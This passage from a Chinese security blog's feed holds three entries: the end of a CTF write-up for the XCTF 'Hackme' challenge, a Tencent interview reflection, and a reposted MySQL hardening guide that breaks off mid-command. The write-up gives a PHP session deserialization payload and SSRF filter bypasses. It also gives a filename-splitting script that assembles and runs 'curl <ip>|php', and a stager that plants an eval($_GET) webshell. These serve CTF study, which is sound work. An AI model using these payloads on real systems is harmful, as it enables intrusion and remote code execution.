stdClass 对象：）</p><blockquote><p>即是PHP 获取到 session 字符串后，就开始查找第一个 |（竖线），用竖线将字符串分割成“键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。 </p></blockquote><h3 id="4-回归题目分析"><a href="#4-回归题目分析" class="headerlink" title="4)回归题目分析"></a>4)回归题目分析</h3><p>我们访问upload文件可以看到，它包含的是他目录下面的<code>init.php</code>。其中存入<code>session</code>使用的是<code>php_serialize</code>模式</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/8.png" alt></p><p>然后我们看我们的目标<code>/core/index.php</code>，里面也包含了一个<code>init.php</code>进行session配置，不过这个<code>init.php</code>跟上面的不一样</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/9.png" alt></p><p>这就导致<code>/core/index.php</code>访问session时和刚刚存储使用的session不同，导致解析漏洞。<strong>会自动将|后面的进行反序列化</strong>，这就实例化了info类，绕过他的构造函数对admin的控制了，成功让admin为1。</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/10.png" alt></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"sign"</span>: <span class="string">'|O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:5:"shabi";&#125;'</span></span><br></pre></td></tr></table></figure><p>获取到源码并进入Part2，进入ssrf的绕过：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/11.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//data:@127.0.0.1/baidu.com?,payload</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//data:@127.0.0.1/plain;base64,payload</span></span><br></pre></td></tr></table></figure><h2 id="Part2-SSRF绕法"><a href="#Part2-SSRF绕法" class="headerlink" title="Part2 - SSRF绕法"></a>Part2 - SSRF绕法</h2><h3 id="1-参考连接"><a href="#1-参考连接" class="headerlink" title="1) 参考连接"></a>1) 参考连接</h3><p>【SSRF】如何绕过filter_var, preg_match和 parse_url <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a> </p><h3 id="2-回归题目分析"><a href="#2-回归题目分析" class="headerlink" title="2)回归题目分析"></a>2)回归题目分析</h3><ul><li>FILTER_VALIDATE_URL 过滤器把值作为URL来验证 。</li><li>compress.zlib://data: 绕过 preg_match 对直接使用data协议data://的绕过 。</li><li>@：绕过 preg_match 对域名为127.0.0.1的绕过。</li><li>file_get_content：绕过本地文件读取直接接受payload的值。</li></ul><blockquote><p>关于绕过filter_var和parse_url，在file_get_contents的情况下，可以用data://伪协议来绕过，对于这样的形式data://text/plain;base64,xxxxx，parse_url会将text作为host，并且PHP对MIME不敏感，改为这样data://baidu.com/plain;base64,xxxxx就能绕过，并且file_get_contents能直接读取到xxxx的内容。由于题目已经禁止了以data开头，所以我们可以用compress.zlib</p></blockquote><h2 id="Linux特性"><a href="#Linux特性" class="headerlink" title="Linux特性"></a>Linux特性</h2><p>EXP里面使用的了一些Linux特性，这里简单的复现一下。</p><h3 id="1-命令可以通过-符号断续执行"><a href="#1-命令可以通过-符号断续执行" class="headerlink" title="1) 命令可以通过 \ 符号断续执行"></a>1) 命令可以通过 \ 符号断续执行</h3><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/1.png" alt></p><p>通过\对命令进行截断，我们最后可以断续的构造出<code>echo 111</code>这个命令。</p><h3 id="2-通过重定向-gt-符号新建文件"><a href="#2-通过重定向-gt-符号新建文件" class="headerlink" title="2) 通过重定向 &gt; 符号新建文件"></a>2) 通过重定向 &gt; 符号新建文件</h3><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/2.png" alt></p><p>重定向就不说了，简单标注 &gt; 和 &gt;&gt; 的区别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; 是追加；</span><br><span class="line">&gt; 是覆盖；</span><br></pre></td></tr></table></figure><p>上例中我通过 &gt; 新建了一个空文件 <code>shabi</code>。</p><h3 id="3-通过命令-sh-执行文件内容"><a href="#3-通过命令-sh-执行文件内容" class="headerlink" title="3) 通过命令 sh 执行文件内容"></a>3) 通过命令 sh 执行文件内容</h3><p>当文件里面的内容是系统命令时，我们能通过 <code>sh 文件名</code>的形式来调用里面命令</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/3.png" alt></p><p>上例我新建shabi文件并写入 <code>echo &#39;you are shabi&#39;</code>，然后我通过<code>sh shabi</code>可见成功执行了其中的命令并打印出内容。</p><h2 id="Part3-命令执行绕法"><a href="#Part3-命令执行绕法" class="headerlink" title="Part3 - 命令执行绕法"></a>Part3 - 命令执行绕法</h2><p>核心payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">pos0 = random.choice(<span class="string">'efgh'</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">'hkpq'</span>)</span><br><span class="line">pos2 = <span class="string">'g'</span>  <span class="comment"># 随意选择字符</span></span><br><span class="line">payload = [</span><br><span class="line"><span class="string">'&gt;dir'</span>,</span><br><span class="line"><span class="comment"># 创建名为 dir 的文件</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;%s\&gt;'</span> % pos0,</span><br><span class="line"><span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;%st-'</span> % pos1,</span><br><span class="line"><span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></span><br><span class="line"><span class="comment"># 因为alphabetical序中t&gt;s</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"><span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></span><br><span class="line"><span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></span><br><span class="line"></span><br><span class="line"><span class="string">'*&gt;v'</span>,</span><br><span class="line"><span class="comment"># * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></span><br><span class="line"><span class="comment">#  dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></span><br><span class="line"><span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;rev'</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></span><br><span class="line"><span class="string">'*v&gt;%s'</span> % pos2,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。</span></span><br><span class="line"><span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></span><br><span class="line"><span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;p'</span>,</span><br><span class="line"><span class="string">'&gt;ph\\'</span>,</span><br><span class="line"><span class="string">'&gt;\|\\'</span>,</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">0</span>:<span class="number">2</span>],</span><br><span class="line"><span class="string">'&gt;\ \\'</span>,</span><br><span class="line"><span class="string">'&gt;rl\\'</span>,</span><br><span class="line"><span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'sh '</span> + pos2,</span><br><span class="line"><span class="comment"># sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></span><br><span class="line"><span class="comment"># 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></span><br><span class="line"><span class="string">'sh '</span> + pos0,</span><br><span class="line"><span class="comment"># sh f 执行curl命令，下载文件，写入木马。</span></span><br></pre></td></tr></table></figure><p>1.当payload执行到<strong>第五行</strong>命令时，可以看出：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/4.png" alt></p><ul><li>创建了五个文件dir、f&gt;、kt-、sl、v，目前仅v是内容非空的，其他为空。</li><li>v中的内容如上<code>f&gt;  kt- sl</code>。</li><li><code>*&gt;v</code>中<strong>*起通配符作用</strong>相当于<code>dir&gt;v</code>，即v的内容<code>f&gt; kt- sl</code>。</li></ul><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/6.png" alt></p><p>2.当继续执行<strong>第六行</strong>命令直到发生魔法那行命令：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/5.png" alt></p><ul><li>新创建了rev空文件，用来起通配作用。</li><li>使用<code>*v&gt;g</code>，这里注意<strong>*起通配符作用</strong>相当于 <code>rev v&gt;g</code>，即把<code>v</code>中内容反序写入g，即g的内容<code>ls -tk &gt;f</code>，目的是为了把命令拆分成文件名，并因为ls的-t选项按<strong>时间排序</strong>，来达成写入文件命令的作用。</li></ul><p>3.当从下面新的截断命令开始到继续执行完命令：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/7.png" alt></p><p>可以看到ls -t的作用就能把这些<strong>通过时间来逆序</strong>把文件名拼接成有顺序的命令。</p><ul><li><code>sh pos2</code>即<code>sh g</code>，通过执行f的内容ls -tk并写入到文件f中</li><li><code>sh pos0</code>即<code>sh f</code>，即执行f的内容（ls -tk的结果，即curl那条命令）去访问服务器的php文件并下载</li></ul><p>4.我们在服务器部署好马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php file_put_contents(\"hh.php\", \"&lt;?php eval(\\\$_GET[c]);?&gt;\");?&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面执行命令后就会请求并下载这个马，我们在访问沙盒下生成的hh.php就能获得flag了</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>附上这次比赛的wp：<a href="https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/。" target="_blank" rel="noopener">https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/。</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XCTF之Hackme&quot;&gt;&lt;a href=&quot;#XCTF之Hackme&quot; class=&quot;headerlink&quot; title=&quot;XCTF之Hackme&quot;&gt;&lt;/a&gt;XCTF之Hackme&lt;/h1&gt;&lt;p&gt;因为疫情在家没事做在写Django的博客。然后刚好Xctf首战新春战
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>面试腾讯</title>
    <link href="http://bai-ren-1.github.io/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/"/>
    <id>http://bai-ren-1.github.io/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/</id>
    <published>2020-03-06T10:32:26.000Z</published>
    <updated>2020-03-06T11:56:30.260Z</updated>
    
    <content type="html"><![CDATA[<h1 id="面试腾讯"><a href="#面试腾讯" class="headerlink" title="面试腾讯"></a>面试腾讯</h1><p>面试梦想中的腾讯，本以为做足了准备，还是缺少了很多事情（很多基础的知识得及时去复习，不然就会以为自己还记得，其实已经不记得了），有些沮丧。但很感谢面试官和耐心地一步一步引导我，让我又有了新的准备方向。</p><h2 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h2><ul><li>具体经历介绍，很具体包括过程，思路，收获（比赛，学到的漏洞和漏洞拓展的具体过程）</li><li>介绍一种熟悉漏洞，并说出怎么防御，并说出怎么绕过这个防御（关于XSS的防御的变化）</li><li>问根据上面的防御和自己的进攻模拟攻防（防御就用普通CSP加上对其的进攻绕过）</li><li>问漏扫项目怎么处理目录遍历这种路径一层一层的情况（枚举）</li><li>问怎么优化这个问题（得好好思考一下）</li><li>问SQL注入的最本质是什么（答语法结构改变，这个并非最根源的原因）</li><li>追问是SQL注入本质，为什么C不会呢（解析）</li><li>问有没有破解过游戏或者软件（crackme）</li><li>问32位int、unsign int所占字节数（4字节，也是4字节，出错于记忆和理解出错，难受了）</li><li>问具体过程（答了一种很简单的验证码绕过）</li><li>pe结构（会，但具体有些遗忘）</li><li>怎么给一个进程免杀（守护进程和hook api？）</li><li>文件水印算法（没有听说过）</li><li>问怎么设计一个水印算法（答文件分块后每块按哈希加密后拼接在后边）</li><li>如何对水印使用动态校验（得好好思考一下）</li><li>sql语句的编写（很难受，因为明明应该很流畅的，下面有复现）</li><li>为什么不能用order by然后limit？（只能选一条）</li><li>问一个具体场景的指针（更难受的地方，太久没使用把最基础的遗忘了还自以为准备充分）</li><li>问开发了一个第三方的API得注意什么（不被泄露给其他第三方，配置隐私）</li><li>给出具体场景就是一个根据id索引给出资料的API（不能枚举越权、SQL注入防止）</li><li>问答</li></ul><p>下面就那些比较简单的答案复现一下，以敲响警钟要全面和扎实一点。</p><h2 id="答案复现"><a href="#答案复现" class="headerlink" title="答案复现"></a>答案复现</h2><h3 id="占字节数"><a href="#占字节数" class="headerlink" title="占字节数"></a>占字节数</h3><ul><li><p>32位编译器：</p><ul><li><p>char：1个字节</p></li><li><p>short int : 2个字节</p></li><li><p>int： 4个字节</p></li><li><p>unsigned int : 4个字节</p></li><li><p>float: 4个字节</p></li><li><p>double:  8个字节</p></li><li><p>long:  4个字节</p></li><li><p>long long: 8个字节</p></li><li><p>unsigned long: 4个字节 </p></li></ul></li><li><p>64位编译器：</p><ul><li>short int : 2个字节</li><li>int： 4个字节</li><li>unsigned int : 4个字节</li><li>float: 4个字节</li><li>double:  8个字节</li><li>long:  4个字节</li><li>long long: 8个字节</li><li>unsigned long: 4个字节 </li><li>unsigned long: 8个字节 </li></ul></li></ul><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><ul><li>找出成绩最高的学生的id：</li></ul><p><img src="/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/2.png" alt></p><p>顺便提醒了自己有关<strong>多表查询、子查询、谓词</strong>的复习</p><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>这个是最难受，连最简单指针的使用形式都忘记了，提醒自己得复习<strong>指针，引用，C++特性,数据结构</strong></p><p><img src="/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/1.png" alt></p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul><li>继续深入挖掘漏洞，在攻防研究可以继续深入，进步还是比较快和大的。</li><li>不只是深入web安全，要把二进制相关的更进一步的学好（不能浅尝辄止）。</li><li>批评在开发基础的表现，不能学了安全就只把目光放在那几款安全开发。</li><li>复习数据结构，计网，操作系统等知识。</li></ul><h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>新的计划，得抽更多时间来进行了。加油，继续冲击腾讯！！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;面试腾讯&quot;&gt;&lt;a href=&quot;#面试腾讯&quot; class=&quot;headerlink&quot; title=&quot;面试腾讯&quot;&gt;&lt;/a&gt;面试腾讯&lt;/h1&gt;&lt;p&gt;面试梦想中的腾讯，本以为做足了准备，还是缺少了很多事情（很多基础的知识得及时去复习，不然就会以为自己还记得，其实已经不记得了
      
    
    </summary>
    
    
      <category term="倾谈" scheme="http://bai-ren-1.github.io/categories/%E5%80%BE%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>MySQL安全配置</title>
    <link href="http://bai-ren-1.github.io/2020/03/04/MySQL%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://bai-ren-1.github.io/2020/03/04/MySQL%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</id>
    <published>2020-03-04T05:37:57.000Z</published>
    <updated>2020-03-04T07:46:43.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL安全配置"><a href="#MySQL安全配置" class="headerlink" title="MySQL安全配置"></a>MySQL安全配置</h1><p>本文转载自 <a href="https://blog.csdn.net/ilnature2008/article/details/54587553?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/ilnature2008/article/details/54587553?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a> </p><h2 id="0x00-Mysql配置文件"><a href="#0x00-Mysql配置文件" class="headerlink" title="0x00 Mysql配置文件"></a>0x00 Mysql配置文件</h2><ul><li>linux系统下是<code>my.conf</code></li><li>windows环境下是<code>my.ini</code></li></ul><p>下面以mysql 5.7版本为例，介绍mysql常见的安全策略、配置、加固方式等等，有些策略可能只针对Linux操作系统，更多策略可以参考<code>CIS Mysql Benchmark</code>相关文档</p><h2 id="0x01-操作系统级别安全配置"><a href="#0x01-操作系统级别安全配置" class="headerlink" title="0x01 操作系统级别安全配置"></a>0x01 操作系统级别安全配置</h2><h3 id="1-不要将数据库放在系统分区"><a href="#1-不要将数据库放在系统分区" class="headerlink" title="1. 不要将数据库放在系统分区"></a>1. 不要将数据库放在系统分区</h3><ul><li>Windows系统：</li></ul><p>直接检查是否将数据库放置在C盘。</p><ul><li>Linux系统：</li></ul><p>在终端连接上mysql数据库，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables where variable_name = &apos;datadir&apos;;</span><br></pre></td></tr></table></figure><p>然后返回shell命令行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h &lt;datadir&gt;</span><br></pre></td></tr></table></figure><p>其中datadir是上一条命令的返回值。</p><p>上述命令的返回值不应是<code>/、/var、/usr</code></p><h3 id="2-使用专用的最小权限账号运行mysql数据库进程"><a href="#2-使用专用的最小权限账号运行mysql数据库进程" class="headerlink" title="2. 使用专用的最小权限账号运行mysql数据库进程"></a>2. 使用专用的最小权限账号运行mysql数据库进程</h3><ul><li>Windows系统：</li></ul><p>直接打开任务管理器，查看运行mysql进程的操作系统账号，不能为administrator账号。</p><ul><li>Linux系统：</li></ul><p>Shell命令行运行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep mysql</span><br></pre></td></tr></table></figure><p>查看mysql服务的运行账号是否为root或其他高权限账号，如果是的，则需要创建一个非管理员专用账号来运行mysql服务。</p><h3 id="3-禁止使用mysql命令行历史记录"><a href="#3-禁止使用mysql命令行历史记录" class="headerlink" title="3. 禁止使用mysql命令行历史记录"></a>3. 禁止使用mysql命令行历史记录</h3><ul><li>Linux系统：</li></ul><p>执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;.mysql_history&quot;</span><br></pre></td></tr></table></figure><p>查看是否存在mysql的历史命令记录文件，如果存在，则需要进行如下加固：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）删除.mysql_history文件；</span><br><span class="line">（2）设置环境变量MYSQL_HISTFILE为/dev/null，并添加到shell的初始化脚本中，创建mysql_history到/dev/null的链接：</span><br><span class="line">ln -s /dev/null $HOME/.mysql_history</span><br></pre></td></tr></table></figure><h3 id="4-确保MYSQL-PWD环境变量未设置敏感信息"><a href="#4-确保MYSQL-PWD环境变量未设置敏感信息" class="headerlink" title="4. 确保MYSQL_PWD环境变量未设置敏感信息"></a>4. 确保MYSQL_PWD环境变量未设置敏感信息</h3><p>Windows系统下进入cmd命令行，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set</span><br></pre></td></tr></table></figure><p>查看是否设置了环境变量MYSQL_PWD。</p><p>Linux系统下使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep MYSQL_PWD /proc/*/environ</span><br></pre></td></tr></table></figure><p>查看MYSQL_PWD环境变量是否设置了敏感信息。</p><p>确认那个配置文件或脚本设置了MYSQL_PWD环境变量。</p><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><h3 id="1-使用数据库专用服务器"><a href="#1-使用数据库专用服务器" class="headerlink" title="1. 使用数据库专用服务器"></a>1. 使用数据库专用服务器</h3><p>使用专用的服务器安装mysql服务可以减少mysql服务的攻击面，尽量卸载或删除操作系统上的不必要的应用或服务，减少其他应用的安装可能给mysql的运行带来的安全风险。</p><h3 id="2-不要复用数据库账号"><a href="#2-不要复用数据库账号" class="headerlink" title="2. 不要复用数据库账号"></a>2. 不要复用数据库账号</h3><p>运行mysql服务的操作系统账号不要用来运行其他应用或服务，这样可以避免其他应用或服务器被攻击给mysql服务带来影响。</p><h3 id="3-历史命令行密码设置为不可见"><a href="#3-历史命令行密码设置为不可见" class="headerlink" title="3. 历史命令行密码设置为不可见"></a>3. 历史命令行密码设置为不可见</h3><p>使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u admin -p password</span><br></pre></td></tr></table></figure><p>连接mysql数据库服务，退出后查看历史命令，确认password是否为明文。</p><p>建议使用如下命令方式登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）先输入mysql -u admin -p</span><br><span class="line">（2）根据命令行提示输入密码；</span><br><span class="line">而不要在一整条命令中输入密码。</span><br><span class="line">另外要控制mysql配置文件访问权限。</span><br></pre></td></tr></table></figure><h2 id="0x03-文件权限控制"><a href="#0x03-文件权限控制" class="headerlink" title="0x03 文件权限控制"></a>0x03 文件权限控制</h2><h3 id="1-控制数据目录的访问权限"><a href="#1-控制数据目录的访问权限" class="headerlink" title="1. 控制数据目录的访问权限"></a>1. 控制数据目录的访问权限</h3><p>数据目录是mysql数据库存放的位置，在mysql命令行界面下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables where variable_name = &apos;datadir&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;datadir&gt;/.. | egrep &quot;^d[r|w|x]&#123;3&#125;------\s*.\s*mysql\s*mysql\s*\d*.*mysql&quot;</span><br></pre></td></tr></table></figure><p>其中<datadir>是第一条命令的执行结果</datadir></p><p>如果存在问题，linux环境下在终端执行如下命令进行加固：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 700 &lt;datadir&gt;</span><br><span class="line">chown mysql:mysql &lt;datadir&gt;</span><br></pre></td></tr></table></figure><h3 id="2-控制二进制日志文件的权限"><a href="#2-控制二进制日志文件的权限" class="headerlink" title="2. 控制二进制日志文件的权限"></a>2. 控制二进制日志文件的权限</h3><p>mysql的运行会产生很多日志，例如二进制日志、错误日志、慢查询日志等等，Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;log_bin_basename&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &lt;log_bin_basename&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;log_bin_basename.nnnnn&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="3-控制错误日志文件的权限"><a href="#3-控制错误日志文件的权限" class="headerlink" title="3. 控制错误日志文件的权限"></a>3. 控制错误日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;log_error&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &lt;log_error&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;log_error&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="4-控制慢查询日志文件的权限"><a href="#4-控制慢查询日志文件的权限" class="headerlink" title="4. 控制慢查询日志文件的权限"></a>4. 控制慢查询日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;slow_query_log_file&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &lt;slow_query_log_file&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;slow_query_log_file&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="5-控制通用日志文件的权限"><a href="#5-控制通用日志文件的权限" class="headerlink" title="5. 控制通用日志文件的权限"></a>5. 控制通用日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;general_log_file&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls 